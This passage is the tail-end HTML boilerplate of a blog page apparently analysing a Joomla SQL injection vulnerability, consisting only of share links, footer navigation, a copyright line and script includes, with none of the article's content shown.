  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&name=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 RickGray
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="http://github.com/RickGray">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


